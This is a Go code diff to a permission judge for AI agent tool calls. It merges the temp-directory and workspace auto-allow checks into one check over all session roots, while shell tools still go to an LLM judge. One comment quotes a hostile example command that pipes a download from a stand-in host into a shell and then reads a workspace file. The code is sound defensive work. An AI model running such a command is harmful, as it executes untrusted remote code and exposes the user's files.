@@ -129,20 +129,14 @@ func (j *ToolJudge) Judge(ctx context.Context, toolName string, input json.RawMe
 	// arbitrary remote code (e.g. `curl evil | sh && cat /ws/x`). Shell tools
 	// always go through the full LLM judge evaluation.
 	if !isShellTool(toolName) {
-		// Unconditionally allow operations inside session temp directory
-		if tempDir := TempDirFrom(ctx); tempDir != "" && AllPathsInDir(input, tempDir) {
+		// Single unified fast-path: auto-allow when every absolute path in the
+		// input is contained within at least one session root (workspace, temp
+		// directory, or an auxiliary allowed root).
+		if AllPathsInSessionRoots(ctx, input) {
 			if log != nil {
-				log.Debug("judge: fast-path temp dir", "tool", toolName, "verdict", "ALLOW")
+				log.Debug("judge: fast-path session roots", "tool", toolName, "verdict", "ALLOW")
 			}
-			return VerdictAllow, "all paths are within the session temp directory", nil
-		}
-
-		// Short-circuit for workspace-internal operations
-		if AllPathsInWorkspace(ctx, input) {
-			if log != nil {
-				log.Debug("judge: fast-path workspace", "tool", toolName, "verdict", "ALLOW")
-			}
-			return VerdictAllow, "all paths are within the session workspace", nil
+			return VerdictAllow, "all paths are within the session roots", nil
 		}
 	}
 
@@ -312,6 +306,51 @@ func AllPathsInWorkspace(ctx context.Context, input json.RawMessage) bool {
 		return false
 	}
 	return AllPathsInDir(input, workspacePath)
+}
+
+// pathInAnyRoot reports whether absPath is contained within at least one of
+// the given roots. Reuses isPathInWorkspace for symlink-resolved containment.
+func pathInAnyRoot(absPath string, roots []string) bool {
+	for _, root := range roots {
+		if isPathInWorkspace(absPath, root) {
+			return true
+		}
+	}
+	return false
+}
+
+// AllPathsInSessionRoots returns true if the JSON input contains at least one
+// absolute path and every such path is within at least one of the session
+// roots (workspace, temp directory, and any additional allowed roots). This
+// is the canonical path-containment check consulted by the judge fast-path.
+func AllPathsInSessionRoots(ctx context.Context, input json.RawMessage) bool {
+	roots := SessionRoots(ctx)
+	if len(roots) == 0 {
+		return false
+	}
+
+	var parsed any
+	if err := json.Unmarshal(input, &parsed); err != nil {
+		return false
+	}
+
+	strValues := ExtractJSONStrings(parsed)
+	var allPaths []string
+	for _, s := range strValues {
+		allPaths = append(allPaths, ExtractPaths(s)...)
+	}
+
+	if len(allPaths) == 0 {
+		return false
+	}
+
+	for _, p := range allPaths {
+		cleaned := filepath.Clean(p)
+		if !pathInAnyRoot(cleaned, roots) {
+			return false
+		}
+	}
+	return true
 }
 
 // parseJudgeResponse extracts verdict and reasoning from LLM response.
